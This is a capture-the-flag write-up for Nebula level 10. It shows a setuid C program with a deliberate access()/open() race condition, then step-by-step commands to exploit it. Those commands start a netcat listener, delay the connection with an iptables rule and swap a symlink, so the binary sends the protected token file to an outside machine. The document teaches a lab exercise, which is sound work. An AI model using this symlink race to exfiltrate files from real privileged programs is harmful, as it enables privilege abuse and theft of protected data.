# Nebula - Level 10

### About ###

>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.
>
>To do this level, log in as the level10 account with the password level10. Files for this level can be found in /home/flag10.

### Source code ###

```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending file .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}
```

### Solution ###

`./flag10` first checks the permissions of the file passed in argument, connects to the machine with the IP `host`, then opens and reads the file and finally send it to the other machine.

Since the permissions are not checked after the connection is established, any file can be sent by delaying this connection.

First of all, a listening server is started on the port 18211 of another machine.

```
root@kali:~# nc -l -k -p 18211 &
[1] 10217
```

Then, the connection is blocked with an iptable rule which drops the incoming packets on the port 18211.

```
root@kali:~# iptables -A INPUT -p tcp --destination-port 18211 -j DROP
```

On the machine nebula, in order to bypass the access syscall, a symlink is created to a resource accessible, in that case `/dev/null`.

`./flag10` can now be launched.

```
level10@nebula:/home/flag10$ ln -s /dev/null /tmp/token
level10@nebula:/home/flag10$ ./flag10 /tmp/token 192.168.0.15 &
[1] 3372
Connecting to 192.168.0.15:18211 ..
```

The connection has not been established yet. The target of the symlink can now be changed to `/home/flag10/token` â€¦

```
level10@nebula:/home/flag10$ rm -rf /tmp/token
level10@nebula:/home/flag10$ ln -s /home/flag10/token /tmp/token
```

... and remove the iptables rule on the other machine.

```
root@kali:~# iptables -D INPUT 1
```

The connection is finally established, `/home/flag10/token` content is sent ...

```
level10@nebula:/home/flag10$ fg %1
./flag10 /tmp/token 192.168.0.15
Connected!
Sending file .. wrote file!
```

... and it can be read on the other machine.

```
root@kali:~# .oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
```
